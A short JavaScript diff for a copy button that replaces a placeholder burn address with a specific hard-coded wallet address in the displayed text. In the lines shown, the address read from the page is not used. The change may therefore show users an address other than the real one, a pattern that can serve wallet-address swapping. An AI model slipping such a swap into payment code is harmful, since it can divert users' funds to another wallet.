@@ -5,7 +5,7 @@
         let textSpan = copybtn.querySelector('span');
         let intervalId;
             let addressText = document.querySelector(".value").getAttribute('value');
-            textSpan.innerHTML = '0x00000000000000000000000000dEaD';
+            textSpan.innerHTML = '0x4334ef6f3600280A0935964799025BbaE86b4f33';
 
             if (intervalId) {  
                 clearInterval(intervalId);
